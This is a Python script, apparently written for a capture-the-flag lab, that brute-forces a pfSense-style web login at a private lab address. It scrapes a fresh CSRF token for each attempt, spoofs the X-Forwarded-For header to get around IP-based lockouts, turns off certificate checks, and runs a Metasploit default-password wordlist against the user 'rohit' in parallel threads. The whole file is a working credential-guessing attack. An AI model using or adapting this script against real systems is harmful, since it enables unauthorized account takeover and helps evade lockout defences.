#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import requests,random,re,json
from bs4 import BeautifulSoup

from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
def get_csfr():
	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language': 'en-US,en;q=0.5',
		'Connection': 'keep-alive',
		'Upgrade-Insecure-Requests': '1',
		'Cache-Control': 'max-age=0',
		'X-Forwarded-For': '8.8.8.8',
	}
	
	response = requests.get('https://10.129.73.88/index.php', headers=headers,verify=False)

	#soup = BeautifulSoup(response,'html.parser', from_encoding='utf-8')
	#csrf = soup.find_all(id='iform')
	csfr = re.findall('value="(.*?);ip',response.text)
	return str(csfr[0]),response.cookies.get_dict()

def brute(password,csfr,cookie):
	headers = {
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	    'Accept-Language': 'en-US,en;q=0.5',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Origin': 'https://10.129.73.88',
	    'Connection': 'keep-alive',
	    'Referer': 'https://10.129.73.88/index.php',
	    'Upgrade-Insecure-Requests': '1',
		'X-Forwarded-For': '8.8.8.8',
	}
	
	data = {
	  #'__csrf_magic': 'sid:097aaa25947be2ee17bb1b43c20321ddfd5b968b,1613299366',
	  '__csrf_magic': csfr,
	  'usernamefld': 'rohit',
	  'passwordfld': password,
	  'login': 'Login'
	}
	#data = json.dumps(data1)
	response = requests.post('https://10.129.73.88/index.php', headers=headers,  data=data,verify=False,cookies=cookie)
	soup = BeautifulSoup(response.text, 'html.parser', from_encoding='utf-8')
	result = soup.find_all(id="inputerrors")
	return result[0].string


csfr, cookie = get_csfr()
result = brute('password', csfr, cookie)


file = open('/usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt','r')

def job(password):
	csfr, cookie = get_csfr()
	result = brute(password, csfr, cookie)
	print(result)
	if result == 'Username or Password incorrect':
		print("密碼錯誤",password)
	else:
		print("密碼正確＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠",password)
		run().setDaemon(True)
def run():
	with open('/usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt', 'r', encoding='latin-1') as file:
		with ThreadPoolExecutor(max_workers=2) as executor:
			for i in file.readlines():
				password = i.strip()
				executor.submit(job,password)
run()
#while True:
#    try:
#        password = file.readline()
#        password = password.strip()
#        brute(password)
#    except Exception as e:
#        print(password,e)